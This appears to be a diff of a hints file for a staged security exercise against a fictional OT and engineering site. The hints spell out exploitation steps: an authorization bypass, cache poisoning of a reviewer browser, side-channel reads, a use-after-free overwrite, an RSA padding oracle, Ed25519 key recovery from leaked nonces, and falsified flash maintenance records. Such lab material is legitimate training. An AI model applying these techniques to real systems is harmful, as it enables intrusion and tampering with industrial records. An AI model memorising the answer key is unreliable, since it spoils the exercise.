@@ -417,10 +417,12 @@ hints:
     h1: The archive plaintext from W12.3 contains the retired_client_certificate (PEM) and rollover dict
       (IDREL-COL-R4 with its CA-signed signature). These are the exchange inputs. The historical PKCS8 key
       from W12.3 is an Ed25519 key — use it to sign the proof message.
-    h2: Sign the message "collect-archive/v3|CUR-COL-CRR-R11|R11|<nonce>" with the historical Ed25519 key.
+    h2: >-
+      Sign the message "collect-archive/v3|CUR-COL-CRR-R11|R11|<nonce>" with the historical Ed25519 key.
       Submit operation: exchange to archive.collection-path. The service checks the cert chain and rollover
       signature but not the retired_subject: true flag, so the retired identity succeeds.
-    h3: Use the returned collection_session token with operation: read and dataset CUR-COL-CRR-R11 at
+    h3: >-
+      Use the returned collection_session token with operation: read and dataset CUR-COL-CRR-R11 at
       revision 11 to retrieve the current protected data for AST-CRR-017. Session expires in 10 minutes;
       a second exchange while it is active returns 409.
     references:
@@ -457,7 +459,8 @@ hints:
     h2: The route checks that the attendee belongs to your contractor organization — validated against the
       roster. But it does not check if your organization is the appointment owner. Supply the roster
       identity (veybridge.tech.204) and Veybridge Technical Services as the caller organization.
-    h3: After the update: attendee=veybridge.tech.204 and owner_organization=Northbank Civil Inspections
+    h3: >-
+      After the update: attendee=veybridge.tech.204 and owner_organization=Northbank Civil Inspections
       is unchanged. Inspection, asset, and window are immutable. Record the updated revision for W13.4.
     references:
     - kind: client_route
@@ -501,7 +504,8 @@ hints:
     h1: The active service from W14.2 is process-read/v2 with CBOR encoding. The retained fieldbag/v1 client
       sends JSON — that is not accepted. Build a CBOR map with keys asset, group, observed_at, and nonce as
       required by process-read/v2.
-    h2: The asset must match the inspection asset (AST-CRR-017) and the group must be OG-CRR-02 (from the
+    h2: >-
+      The asset must match the inspection asset (AST-CRR-017) and the group must be OG-CRR-02 (from the
       expected_outlets in the field bag). Use a fresh observed_at timestamp (within 10 minutes) and a unique
       nonce. Submit with Content-Type: application/cbor and your W13.4 contractor session.
     h3: The route returns FEED-OG2-R21 with observations for FIT-CRR-204A and FIT-CRR-204B, the instruments
@@ -523,7 +527,8 @@ hints:
     - kind: client_route
       id: maintenance.drawing-cache
   W15.2:
-    h1: The drawing-cache-update route accepts a controlled HTML body from the allowlisted preview origin
+    h1: >-
+      The drawing-cache-update route accepts a controlled HTML body from the allowlisted preview origin
       preview-cinder.arwc.test. Set X-Preview-Origin: https://preview-cinder.arwc.test and submit your
       controlled response with cache path /viewer/drawings/DRW-OG2-R8, preserving drawing_id and revision.
     h2: The controlled body must be CRLF-free HTML. After a successful cache update (201), trigger the
@@ -539,7 +544,8 @@ hints:
     h1: After completing the W15.2 cache update, call POST maintenance.drawing-approvals (from the client
       document) with cache_key=GET:/viewer/drawings/DRW-OG2-R8 and reviewer_queue=REV-CRR-4417. Use your
       W13.4 contractor session.
-    h2: The service runs the real Chromium 128 reviewer browser on the controlled drawing you poisoned in
+    h2: >-
+      The service runs the real Chromium 128 reviewer browser on the controlled drawing you poisoned in
       W15.2. The reviewer's JavaScript accepts the postMessage without checking event.source, which is the
       source_check: "omitted" flaw.
     h3: The returned CAP-REVIEW-CRR-4417 with source_check="omitted" and browser="Chromium 128" is the
@@ -564,7 +570,8 @@ hints:
     h1: Call GET retained-archive.arwc.test/api/sequencer-specs/current with your CORPORATE session to retrieve
       the SEQ-CRR-4 descriptor. It contains the opcode table, authorized index range, and the ordinary trace
       SEQ-BASE-17 with its program_hex.
-    h2: Submit the ordinary trace with POST retained-archive.arwc.test/api/sequencer-programs and body
+    h2: >-
+      Submit the ordinary trace with POST retained-archive.arwc.test/api/sequencer-programs and body
       {"program_hex": "0104000007000000"}. The program decodes as LOAD slot 4 (the zero reference) followed
       by HALT. The service checks that the descriptor was observed first.
     h3: The expected result is authorized-load with cycles=228. Confirm the service-owned audit shows
@@ -581,7 +588,8 @@ hints:
     h2: Any LOAD with index >= 32 returns late-authorization-rejection with a non-null boundary_index. The cycle
       cost 20 + 4 * bit_count(sample) is accumulated before the check, so the cycle count still encodes
       information about the out-of-window slot's bit population.
-    h3: Target slot 159 for the designated crossing. Program bytes 01 9F 00 00 07 00 00 00 (LOAD 159, HALT),
+    h3: >-
+      Target slot 159 for the designated crossing. Program bytes 01 9F 00 00 07 00 00 00 (LOAD 159, HALT),
       base64 AZ8AAAcAAAA=. Expected response: status=late-authorization-rejection, boundary_index=159, cycles=236.
     references:
     - kind: client_route
@@ -602,7 +610,8 @@ hints:
     h1: Slots 160-191 hold the 32-byte calibration record. Use POST /api/signal-experiments measure programs
       targeting those slots. Max 63 TEST instructions per program (64-instruction limit includes HALT), so
       cover 32 slots with 9 probes each across 5 programs.
-    h2: Apply the W16.3 bit-discrimination to each of the 32 slots. Reconstruct all bytes, then verify the
+    h2: >-
+      Apply the W16.3 bit-discrimination to each of the 32 slots. Reconstruct all bytes, then verify the
       CRC32C: last 4 bytes must equal crc32c(first 28 bytes) in big-endian. If the check passes, the
       calibration is complete.
     h3: Submit to POST /api/instrument-history/current with record_id="CAL-CRR-OG2-R8", field_revision="R8",
@@ -640,9 +649,11 @@ hints:
     h1: Read ~/CairnReach/Briefs/W17/engineering-reference.md (reference CRR-ENG-INST-204B-R1). It maps the
       outlet B flow transmitter FIT-CRR-204B to IEC variable FlowBM3s, OPC UA NodeId, historian series, and
       unit. The reference describes the identity but does not supply a current value or confirm quality.
-    h2: Confirm in the historian catalog: SELECT variable, series, node_id, unit FROM ot_history.tag_catalog
+    h2: >-
+      Confirm in the historian catalog: SELECT variable, series, node_id, unit FROM ot_history.tag_catalog
       WHERE series = 'flow_b_m3s'. The result must match the reference document exactly on all five fields.
-    h3: Verify the point is live: SELECT time, fields->>"value" FROM ot_history.process_samples WHERE
+    h3: >-
+      Verify the point is live: SELECT time, fields->>"value" FROM ot_history.process_samples WHERE
       tags->>"variable" = 'FlowBM3s' ORDER BY time DESC LIMIT 1 confirms recent StatusGood samples.
     references:
     - kind: participant_artifact
@@ -664,7 +675,8 @@ hints:
     h1: Read ~/CairnReach/Briefs/W18/tag-register.csv (register CRR-IO-R364, project_revision=364, 6 Modbus
       input registers PDU offset 0-5). Then read /usr/share/arwc-ot/tags.json on the OT engineering host
       to confirm its project_revision=364 matches.
-    h2: Confirm the running revision via OPC UA: query nsu=urn:arwc:crr:tags;s=CRR.ProjectRevision from FUXA
+    h2: >-
+      Confirm the running revision via OPC UA: query nsu=urn:arwc:crr:tags;s=CRR.ProjectRevision from FUXA
       or the historian; it must equal 364. Then confirm all five process variable entries in
       ot_history.tag_catalog share register_sha256=df09d72a355340266896c59a204248e02aa277769f881e7a2f6ce6d15b6f7a3b.
     h3: The five required process variables (non-heartbeat) are LevelM (%IW0), PositionPct (%IW1), FlowM3s
@@ -673,13 +685,15 @@ hints:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W18/tag-register.csv
   W18.2:
-    h1: From CRR-IO-R364, find FIT-CRR-204B: FC4, PDU offset 5, IEC address %IW5, raw FlowBRaw (UINT,
+    h1: >-
+      From CRR-IO-R364, find FIT-CRR-204B: FC4, PDU offset 5, IEC address %IW5, raw FlowBRaw (UINT,
       10000 counts/m3/s), engineering FlowBM3s. The PDU offset (5) and IEC word offset (5 in %IW5) look
       the same here because address_base=0, but they are different addressing layers.
     h2: The scale factor (10000 counts/m3/s) is in the register definition, NOT in the OPC UA tag name or
       historian series. A raw value of 1000 counts = 0.100 m3/s. Confirm the engineering value via FUXA
       and via ot_history.tag_catalog (variable=FlowBM3s, unit=m3/s).
-    h3: Catalog query: SELECT variable, series, node_id, unit FROM ot_history.tag_catalog WHERE
+    h3: >-
+      Catalog query: SELECT variable, series, node_id, unit FROM ot_history.tag_catalog WHERE
       variable = 'FlowBM3s'. Returns flow_b_m3s, nsu=urn:arwc:crr:tags;s=CRR.FlowBM3s, m3/s. Record
       all seven layers to complete the binding.
     references:
@@ -689,7 +703,8 @@ hints:
     h1: Read ~/CairnReach/Briefs/W18/history-provenance.md first. Run the LAG gap query against
       public.process_history with tag = 'flow_b_m3s' (series name, not OPC UA variable name FlowBM3s)
       and filter for transport_quality ILIKE '%Good%'. Order by source_gap DESC to find the largest gap.
-    h2: The largest qualifying gap is about 1 day 3 hours 53 minutes: last good sample 2026-11-13 16:54:46
+    h2: >-
+      The largest qualifying gap is about 1 day 3 hours 53 minutes: last good sample 2026-11-13 16:54:46
       UTC, next good sample 2026-11-14 20:48:19 UTC. This is a real collection interruption. Record all
       three timestamps and both quality fields for both bounding rows.
     h3: Confirm unit=m3/s did not change across the gap (both sides show m3/s, value=0.100 m3/s). The gap
@@ -699,10 +714,12 @@ hints:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W18/history-provenance.md
   W18.4:
-    h1: Build the A/B mapping from CRR-IO-R364: outlet A uses PDU offsets 1 (%IW1, PositionPct) and 2
+    h1: >-
+      Build the A/B mapping from CRR-IO-R364: outlet A uses PDU offsets 1 (%IW1, PositionPct) and 2
       (%IW2, FlowM3s); outlet B uses PDU offsets 4 (%IW4, PositionBPct) and 5 (%IW5, FlowBM3s).
       Confirm all four OPC UA NodeIds and historian series from ot_history.tag_catalog.
-    h2: Choose a 1-second window in ot_history.process_samples and query all four variables at the same
+    h2: >-
+      Choose a 1-second window in ot_history.process_samples and query all four variables at the same
       source_time. Verify physical consistency: at 20% position, flow should be ~20% of 0.5m3/s = 0.100
       m3/s. Both outlets currently show 20% position and 0.100m3/s flow — symmetric.
     h3: The observation must show both outlets' position AND flow at the same UTC timestamp with Good
@@ -723,16 +740,18 @@ hints:
       (ot_history.tag_catalog variable=ProjectRevision). The gap between the diagnostic's project generation
       and the running system's revision is the finding.
     references:
-    - kind: gitea_repo
-      id: clara.morivelle/retained-engineering-tools
+    - kind: participant_service
+      id: engineering.arwc.test
   W19.2:
     h1: The binary has two entry points. The alternate path uses mixed_mode_entry which pushes CS=0x23 (32-bit
       compatibility segment) and executes RETFQ. Use objdump -M intel -d to find the far return and the .code32
       section. The alternate test record WRAP-FFFFFFFF-OG2 is embedded in the binary (visible via strings).
-    h2: Implement the 32-bit decoder: value = (rotl32(value^byte, 5) + 0x9E3779B9) & 0xFFFFFFFF starting at
+    h2: >-
+      Implement the 32-bit decoder: value = (rotl32(value^byte, 5) + 0x9E3779B9) & 0xFFFFFFFF starting at
       0x6D2B79F5. The 32-bit rotate is ((v<<5) | (v>>27)) & 0xFFFFFFFF. All wraps at 32 bits. The 64-bit
       version without wraps produces a different value that the service rejects.
-    h3: POST https://process-view.arwc.test/api/signature-records/current/interpretation with CORPORATE Bearer:
+    h3: >-
+      POST https://process-view.arwc.test/api/signature-records/current/interpretation with CORPORATE Bearer:
       {"record":"WRAP-FFFFFFFF-OG2","rolling32":"<8-hex-digits>"}. Correct result returns DIAG-TRACE-COMPAT-19
       with execution=i386-compatibility and sets compatibility_reproduced=True for W19.3.
     references:
@@ -742,10 +761,12 @@ hints:
     h1: W19.1 ordinary_traces gives rolling32 AND verifier64 for the first 4 records. The 5th is named
       protected_record. Implement the same verifier formula for all 5. The verifier takes the 32-bit rolling
       result and applies a 64-bit function embedded in the binary's long-mode verifier code.
-    h2: Verifier formula: start v=0x243F6A8885A308D3 (pi constant). For each rolling32 r:
+    h2: >-
+      Verifier formula: start v=0x243F6A8885A308D3 (pi constant). For each rolling32 r:
       v=ROTL64(v XOR (zero_extend(r)*0x100000001B3), 9). Final verifier64=v XOR zero_extend(r).
       The 64-bit constant and FNV-prime variant (0x100000001B3) are in the binary.
-    h3: POST https://process-view.arwc.test/api/signature-programs/current with CORPORATE Bearer:
+    h3: >-
+      POST https://process-view.arwc.test/api/signature-programs/current with CORPORATE Bearer:
       {"decisions":[{record,rolling32,verifier64}x5]} for all 5 in order. Service validates all and
       returns MIG-OG2-R19-R21 with verifier64 and decision=valid, sets hidden_check_recovered=True.
     references:
@@ -755,10 +776,12 @@ hints:
     h1: Use the process.diagnostic-program-legacy route from the engineering workbench client document
       (/.well-known/arwc-client). POST https://process-view.arwc.test/api/diagnostic-programs/legacy with
       CORPORATE Bearer. Gates on hidden_check_recovered (W19.3). Supplies W19.MAP.
-    h2: Compute comparison_digest: SHA256 of the mapping JSON (sorted keys) with legacy_project=CRR-CTRL-R19,
+    h2: >-
+      Compute comparison_digest: SHA256 of the mapping JSON (sorted keys) with legacy_project=CRR-CTRL-R19,
       current_project=CRR-CTRL-R21, instruments={OUTLET_A:FIT-CRR-204A,OUTLET_B:FIT-CRR-204B},
       legacy_identifiers={OUTLET_A:OG-CRR-02/GT-CRR-02A,OUTLET_B:OG-CRR-02/GT-CRR-02B}. Not in any file.
-    h3: Discover the observation: SELECT name, text, alarm_group FROM alarm_history WHERE
+    h3: >-
+      Discover the observation: SELECT name, text, alarm_group FROM alarm_history WHERE
       alarm_group='OG-CRR-02' to find the qualifying commissioning event name. Submit {"migration_record":
       "MIG-OG2-R19-R21","comparison_digest":"<sha256>","observation":"<event_name>"}. Returns
       MAP-OG2-LEGACY-R21 historical=true current_project=CRR-CTRL-R21. Do not replace the running revision.
@@ -766,26 +789,32 @@ hints:
     - kind: client_route
       id: process.diagnostic-program-legacy
   W20.1:
-    h1: Call GET https://independent-instruments.arwc.test/api/firmware-images/current with CORPORATE Bearer.
+    h1: >-
+      Call GET https://independent-instruments.arwc.test/api/firmware-images/current with CORPORATE Bearer.
       Returns the image manifest (sha256, record layout: magic=F204, 64-byte records, 4096-byte erase pages)
       and the image base64. The image is also in Gitea clara.morivelle/retained-engineering-tools/instruments/.
-    h2: Parse 8192 bytes into 64-byte records. Valid record: magic=F204, CRC32C of bytes 0-55 at bytes 56-59,
+    h2: >-
+      Parse 8192 bytes into 64-byte records. Valid record: magic=F204, CRC32C of bytes 0-55 at bytes 56-59,
       commit=0x00 at byte 63. Payload at bytes 12+: record_id\0asset\0inspection_date null-separated.
       Status byte 10 (1=REVIEW, 2=ACCEPTED), status_bits byte 11. Highest sequence wins per record_id.
-    h3: POST https://independent-instruments.arwc.test/api/maintenance-records/current with CORPORATE Bearer:
+    h3: >-
+      POST https://independent-instruments.arwc.test/api/maintenance-records/current with CORPORATE Bearer:
       {image_sha256, record_id, asset, inspection_date, sequence, status, status_bits, crc32c, offset}.
       All 8 fields validated. Returns inspection record with fresh audit. Sets inspection_recovered=True.
     references:
     - kind: client_route
       id: process.firmware-image
   W20.2:
-    h1: The W20.1 record has status=REVIEW. To promote it to ACCEPTED, write a new record at offset 128
+    h1: >-
+      The W20.1 record has status=REVIEW. To promote it to ACCEPTED, write a new record at offset 128
       (the next erased slot, all 0xFF). NOR flash programming changes only 1→0, so writing to an erased
       slot is always valid. New record: sequence=119, status=0x02 (ACCEPTED), same asset/date as original.
-    h2: Build the 64-byte record: magic=F204, seq=119 (uint32 LE), payload_len=40 (uint16 LE), status=0x02,
+    h2: >-
+      Build the 64-byte record: magic=F204, seq=119 (uint32 LE), payload_len=40 (uint16 LE), status=0x02,
       status_bits=0x01, payload at bytes 12-51, CRC32C of bytes 0-55 at bytes 56-59, 0xFFFFFF at 60-62,
       commit=0x00 at byte 63. Split: 3 operations at offsets 128 (56 bytes), 184 (4 bytes), 191 (1 byte).
-    h3: POST https://independent-instruments.arwc.test/api/maintenance-records/current with CORPORATE Bearer:
+    h3: >-
+      POST https://independent-instruments.arwc.test/api/maintenance-records/current with CORPORATE Bearer:
       {"operations":[{kind,offset,data_b64}x3],"image_b64":"<modified_8192_bytes>"}. Service validates NOR
       semantics, confirms seq=119 status=ACCEPTED. Returns updated record. Sets image_rewrite_accepted=True.
     references:
@@ -795,7 +824,8 @@ hints:
     h1: Correcting inspection_date from 2026-09-18 to 2026-09-19 flips bit 0 of the ASCII '8' byte (0x38)
       to '9' (0x39) — a 0→1 transition requiring a page erase first. Submit erase page 0 as the first op,
       then rewrite all 3 records (CAL at 0, REVIEW at 64, corrected ACCEPTED seq=120 at 128).
-    h2: 10 total operations: {"kind":"erase","page":0} + 3 program ops for CAL (offsets 0,56,63) + 3 for
+    h2: >-
+      10 total operations: {"kind":"erase","page":0} + 3 program ops for CAL (offsets 0,56,63) + 3 for
       REVIEW (offsets 64,120,127) + 3 for corrected record (offsets 128,184,191). The corrected record has
       seq=120, status=ACCEPTED, inspection_date=2026-09-19, and new CRC32C of its first 56 bytes.
     h3: Service validates NOR semantics, confirms seq=120 ACCEPTED date=2026-09-19, wear_counts=[18,9].
@@ -807,10 +837,12 @@ hints:
     h1: Read ~/CairnReach/Briefs/W21/deployment-note.md (CRR-PLC-COM-364) for five claims to verify. Open
       ~/CairnReach/controller in OpenPLC Editor or inspect directly. The commissioning note is starting
       material; the project files are authoritative.
-    h2: project.json: name=arwc-site, task0 Cyclic T#100ms, program=main. devices/configuration.json:
+    h2: >-
+      project.json: name=arwc-site, task0 Cyclic T#100ms, program=main. devices/configuration.json:
       deviceBoard=OpenPLC Runtime v4, runtimeIpAddress=172.29.63.20. pous/programs/main.fbd: declared
       ProjectRevision : UINT := 364.
-    h3: Independently observe ProjectRevision from the live OT: query CRR.ProjectRevision from FUXA or
+    h3: >-
+      Independently observe ProjectRevision from the live OT: query CRR.ProjectRevision from FUXA or
       ot_history.tag_catalog. Confirm the running value (364) matches the saved project's declared value.
       Do not compile, upload, start, stop, or force anything.
     references:
@@ -820,10 +852,12 @@ hints:
     h1: Compile the saved project in OpenPLC Editor, connect to the runtime at 172.29.63.20:8443 without
       accepting any upload offer. The editor's compiled-program MD5 must match the runtime's readProgramMd5.
       Authenticate to the Runtime API (POST /api/login) to query GET /api/status for running state.
-    h2: The program MD5 (from the debug channel or /api/readProgramMd5) is not in any shipped file — it
+    h2: >-
+      The program MD5 (from the debug channel or /api/readProgramMd5) is not in any shipped file — it
       proves which compiled binary is scanning. Also verify: runtime state=STATUS:RUNNING, no active forces,
       and live ProjectRevision=364 from the editor debugger or OT historian.
-    h3: All four conditions required: program MD5 match, STATUS:RUNNING, no forces, live ProjectRevision=364.
+    h3: >-
+      All four conditions required: program MD5 match, STATUS:RUNNING, no forces, live ProjectRevision=364.
       A connection alone is insufficient. The program MD5 and runtime state are the independent live evidence.
       This supplies W21.REVISION.
     references:
@@ -843,13 +877,16 @@ hints:
     - kind: client_route
       id: process.sealed-viewer
   W22.2:
-    h1: W22.1 ordinary_cases has 4 programs (program_b64, base64-encoded 6-byte-aligned bytecode). The
+    h1: >-
+      W22.1 ordinary_cases has 4 programs (program_b64, base64-encoded 6-byte-aligned bytecode). The
       expected results are NOT included — implement the 16-bit VM from the architecture description or by
       analyzing the sealed-viewer binary: 4 registers, 256 bytes memory, 6-byte LE instructions, 4096 cap.
-    h2: 8 opcodes: MOVI/LOAD8/XOR/ADD/ROTL/STORE8/JNZ/HALT with 16-bit wrap arithmetic. LOAD8 zero-extends
+    h2: >-
+      8 opcodes: MOVI/LOAD8/XOR/ADD/ROTL/STORE8/JNZ/HALT with 16-bit wrap arithmetic. LOAD8 zero-extends
       memory[(reg[src]+imm)&0xFF]. STORE8 writes reg[src]&0xFF. ROTL uses imm&15. JNZ adds signed imm to PC
       only if zero flag is false. Each result needs registers, SHA256(memory[0x40:0x80]), and steps.
-    h3: POST https://process-view.arwc.test/api/sealed-viewers/current/execute with CORPORATE Bearer:
+    h3: >-
+      POST https://process-view.arwc.test/api/sealed-viewers/current/execute with CORPORATE Bearer:
       {"cases":[result_0,result_1,result_2,result_3]}. Verify all 4 match the reference cases. Returns
       VIEW-VM-R5 with full VM spec. Sets vm_reconstructed=True for W22.3+.
     references:
@@ -859,7 +896,8 @@ hints:
     h1: The W22.1 service response includes program_b64 (the viewer program) and package_b64 (the sealed project
       package). Run the viewer program through your W22.2 reconstructed 16-bit VM to completion. Record the final
       register values (r0–r3) and memory[0x40:0x80].
-    h2: Derive the AES-256-GCM key from VM final state. SHA-256 of: ASCII "CRR-SEALED-PKG-R7", a NUL byte (0x00),
+    h2: >-
+      Derive the AES-256-GCM key from VM final state. SHA-256 of: ASCII "CRR-SEALED-PKG-R7", a NUL byte (0x00),
       memory[0x40:0x80] (64 bytes), LE16(r0), LE16(r1), LE16(r2), LE16(r3). Decrypt the sealed package — first 12
       bytes are the nonce, remaining bytes are ciphertext+tag, AAD is "CRR-SEALED-PKG-R7". Verify locally first.
     h3: Submit POST https://process-view.arwc.test/api/sealed-projects/current with CORPORATE Bearer and body
@@ -874,7 +912,8 @@ hints:
       disabled (COMPlus_ReadyToRun=0 dotnet ReviewHelper.dll). The reviewer name changes between runs. The name
       that appears only under native execution is the concealed identity; the managed metadata lists a different
       reviewer.
-    h2: The concealed reviewer is a Nextcloud user. List files shared with your CORPORATE Nextcloud account:
+    h2: >-
+      The concealed reviewer is a Nextcloud user. List files shared with your CORPORATE Nextcloud account:
       GET /ocs/v2.php/apps/files_sharing/api/v1/shares?format=json&shared_with_me=true with your CORPORATE
       credentials. Find the share from the concealed reviewer — the share note contains the archive session ID.
     h3: Submit POST https://process-view.arwc.test/api/unlisted-reviewers/current with CORPORATE Bearer and body
@@ -889,7 +928,8 @@ hints:
       {"estimator":"EST-CRR-23","mode":"baseline"}. Response includes the estimator binary (artifact_b64,
       144-byte Measurement objects), SHA256, and operation limit 8. Download and analyze the binary — static
       C++ binary using Measurement objects in a vector AND a source-ID unordered_map index.
-    h2: The UAF: adding a duplicate source_id coalesces measurements — vector element freed but source-ID index
+    h2: >-
+      The UAF: adding a duplicate source_id coalesces measurements — vector element freed but source-ID index
       retains the stale pointer. With glibc 2.39 tcache, the next 0x90-byte PlanningState allocation gets the
       same chunk. Submit four ops: add FIT-CRR-204B twice, add PROBE-CRR-23, write-stale offset=64
       u32=1129468466 (vtable 0x4553544352523233 >> 8, low 32 bits). Service returns EST-UAF-CRR-23.
@@ -925,7 +965,8 @@ hints:
       includes RECOVERY-ORACLE-R4 with 4 labeled examples (class + ciphertext for A-D), 4 prediction cases
       (request_id + epoch_bucket only — no class), and selector_validation_cases showing known selector
       rotations. Study the labeled examples to understand the RSA PKCS#1 v1.5 class structure.
-    h2: The oracle applies a rotation: observed_class = shift(padding_class, rotation) where rotation =
+    h2: >-
+      The oracle applies a rotation: observed_class = shift(padding_class, rotation) where rotation =
       selector(request_id, epoch_bucket) & 3. Implement the xorshift128+ selector function using
       selector_validation_cases to verify. Then compute the rotation for each prediction case's (request_id,
       epoch_bucket) pair to determine its observed_class.
@@ -936,11 +977,13 @@ hints:
     - kind: participant_service
       id: process-view.arwc.test
   W24.2:
-    h1: POST https://process-view.arwc.test/api/estimator-tasks/current with CORPORATE Bearer and body
+    h1: >-
+      POST https://process-view.arwc.test/api/estimator-tasks/current with CORPORATE Bearer and body
       {"operation":"oracle","ciphertext":"<512-hex>","request_id":"<16-hex>","epoch_bucket":1770000042}
       (epoch_bucket must be exact). The oracle runs real RSA-2048 decryption and returns observed_class A/B/C/D.
       Deduplicates ciphertexts; use unique ciphertexts or request_ids per query. Limit: 4096 total.
-    h2: Before each query, predict observed_class = shift(raw_class, rotation) where rotation =
+    h2: >-
+      Before each query, predict observed_class = shift(raw_class, rotation) where rotation =
       selector(request_id, 1770000042) & 3 (xorshift128+ from W24.1). Use class-D labeled example ciphertext
       with varying request_ids to verify your selector. Confirmed: rid=2400000000000001 rot=2 → D+2=B.
     h3: target_ciphertext in the oracle contract is RSA_TARGET — the encryption of the UNLOCK value needed
@@ -950,7 +993,8 @@ hints:
     - kind: participant_service
       id: process-view.arwc.test
   W24.3:
-    h1: RSA_TARGET from the oracle contract is RSA-encrypted UNLOCK. Use multiplicative blinding: submit
+    h1: >-
+      RSA_TARGET from the oracle contract is RSA-encrypted UNLOCK. Use multiplicative blinding: submit
       c*s^e mod N to the oracle, observe class of s*m mod N. Choose request_ids with rotation=0
       (selector(rid,EPOCH_BUCKET)&3==0) to get unrotated classes. Class D = valid PKCS#1 AND ENG1 tag.
     h2: 4-class oracle is faster than binary valid/invalid. Class C = valid structure BUT wrong payload tag.
@@ -964,13 +1008,16 @@ hints:
     - kind: participant_service
       id: process-view.arwc.test
   W24.4:
-    h1: From W24.3 bundle: extract nonce_bits_60_251 (k>>60) for records 1+2, signed_low60_delta from
+    h1: >-
+      From W24.3 bundle: extract nonce_bits_60_251 (k>>60) for records 1+2, signed_low60_delta from
       recovery_metadata, fresh_export_request_b64, and signer.public_key. Compute challenge h =
       int.from_bytes(SHA-512(R||public_key||canonical_message),"little") mod L for each record.
-    h2: Apply HNP formula: x=((s2-s1)-((k2_hi-k1_hi)<<60)-delta)*inverse(h2-h1,L) mod L. Verify by
+    h2: >-
+      Apply HNP formula: x=((s2-s1)-((k2_hi-k1_hi)<<60)-delta)*inverse(h2-h1,L) mod L. Verify by
       computing x*B and comparing to public key (Edwards25519: p=2^255-19, L=2^252+2774...). Use a
       fresh nonce k_new for the new signature (do not reuse any record's nonce).
-    h3: Sign FRESH_EXPORT (from bundle) with recovered x: k_new=any_fresh, R_new=k_new*B,
+    h3: >-
+      Sign FRESH_EXPORT (from bundle) with recovered x: k_new=any_fresh, R_new=k_new*B,
       h_new=SHA-512(R_new||A||FRESH_EXPORT) mod L, s_new=(k_new+h_new*x) mod L. POST
       /api/reporting-submissions with {"export_request_b64":base64(FRESH_EXPORT),"R":hex,"s":hex}.
       Service genuinely verifies Ed25519. Returns CAL-EXCEPT-CRR-R21 with 2 calibration exceptions.
@@ -982,7 +1029,8 @@ hints:
       installed controller limits (manual 0-100%, auto 0-1.0 m3/s), physical capacity (0.5 m3/s per outlet),
       and the authorized movement (baseline A20/B20, observation A30/B10, restoration A20/B20, mode=manual).
       Confirm limits in FUXA Site controls view and the OpenPLC SiteRequests-and-OutletControl project.
-    h2: Verify via real OT historian: SELECT variable, value FROM ot_history.process_samples to confirm
+    h2: >-
+      Verify via real OT historian: SELECT variable, value FROM ot_history.process_samples to confirm
       PositionPct=20% (outlet A) and PositionBPct=20% (outlet B) at baseline. Physical capacity 0.5 m3/s
       per outlet is from the OPC UA tag catalog (FlowM3s range [0,0.5]). Total flow 0.20 m3/s at baseline.
     h3: Submit POST https://process-view.arwc.test/api/process-estimator/current with CORPORATE Bearer and
@@ -994,12 +1042,15 @@ hints:
     - kind: participant_artifact
       id: /home/fieldlink/CairnReach/Briefs/W25/operating-envelope.csv
   W25.2:
-    h1: From FUXA overview + outlet faceplates + OT historian (ot_history.process_samples), read the permissive chain:
+    h1: >-
+      From FUXA overview + outlet faceplates + OT historian (ot_history.process_samples), read the permissive chain:
       IoHealthy=true, PermissiveA=true, PermissiveB=true, TravelFaultA/B=false (clear),
       LowLevelAlarm=false (clear), HmiStop=false (clear). These safety conditions are all good.
-    h2: Check controller state: Armed=false (not armed for movement), Owner=0 (not HMI-owned). The controller is NOT
+    h2: >-
+      Check controller state: Armed=false (not armed for movement), Owner=0 (not HMI-owned). The controller is NOT
       armed for an HMI-owned manual request. These two conditions block movement in the current state.
-    h3: Submit POST /api/process-permissive/current with CORPORATE Bearer and body {record_id:CRR-OP-W25-R1,
+    h3: >-
+      Submit POST /api/process-permissive/current with CORPORATE Bearer and body {record_id:CRR-OP-W25-R1,
       io_healthy:true, permissive_a:true, permissive_b:true, travel_fault_a:false, travel_fault_b:false,
       low_level_clear:true, operator_stop_clear:true, controller_armed:false, owner_hmi:false, may_move:false}.
       Returns W25-PERMISSIVE-CRR-R1 with blocking conditions: controller_not_armed, owner_not_hmi.
@@ -1039,7 +1090,8 @@ hints:
   W26.2:
     h1: Begin with the renderer profile and the approved inspection it names. Compare the contractor submission
       boundary with the reviewer-only preview boundary rather than guessing a renderer action.
-    h2: 'This is confused preview authority: a contractor-controlled package crosses into a preview evaluated with
+    h2: >-
+      'This is confused preview authority: a contractor-controlled package crosses into a preview evaluated with
       reviewer privileges. Keep inspection, renderer, and submitter identities distinct.'
     h3: Capture an ordinary contractor submission and a denied privileged preview, then vary only the work-package
       reference and compare which identity the renderer records for the preview.
@@ -1072,7 +1124,8 @@ hints:
     h1: POST https://process-view.arwc.test/api/signature-programs/current/reproductions with CORPORATE Bearer
       and body {"operation":"materials","record_id":"VER-ROT128-R3"}. Returns the rot128-verifier ELF binary
       (verifier_b64) and 6 DPG1 programs (program_b64). Reverse-engineer the ROT128 algorithm from the binary.
-    h2: ROT128 algorithm: pad data with 0x80 then zeros to 16-byte boundary. IV=0x6a09e667f3bcc908bb67ae8584caa73b
+    h2: >-
+      ROT128 algorithm: pad data with 0x80 then zeros to 16-byte boundary. IV=0x6a09e667f3bcc908bb67ae8584caa73b
       (u128 LE). For each 16-byte block: s = ROTL128(s,17) XOR block XOR ROTL128(block,41). Final: s XOR
       ROTL128(s,29) XOR unpadded_byte_length. Each block is little-endian u128. Six programs test header
       inclusion, padding, rotation direction, endian order, and length handling.
@@ -1102,11 +1155,13 @@ hints:
     h1: POST /api/diagnostic-runs (via process-view.arwc.test, same proxy path as other diagnostic routes).
       Body {"record_id":"DPG-CRR-CINDER","consumer":"PLAN-CONSUMER-R8","program_b64":"<b64>"}. Requires W27.2
       collision_model_created state; gates on the planning consumer accepting the false estimate.
-    h2: Build the GF(2) collision for TARGET_ID (DPG-CRR-CINDER) with cairn_reserve=13.4 instead of 12.4. Set up:
+    h2: >-
+      Build the GF(2) collision for TARGET_ID (DPG-CRR-CINDER) with cairn_reserve=13.4 instead of 12.4. Set up:
       base = build_program(BASE_ID, cairn=12.4); target_zero = build_program(TARGET_ID, cairn=13.4, reservoir=0).
       Solve 128-equation GF(2) system the same way as W27.2 but over target_zero. changed_only(candidate,
       purpose="target") allows RESERVOIR_BYTES, program-id field (bytes 48-63), and CAIRN_VALUE_OFFSET range.
-    h3: The service validates: program_id=DPG-CRR-CINDER, outputs={Cairn Reach:13.4, North:8.1, Merewick:7.65},
+    h3: >-
+      The service validates: program_id=DPG-CRR-CINDER, outputs={Cairn Reach:13.4, North:8.1, Merewick:7.65},
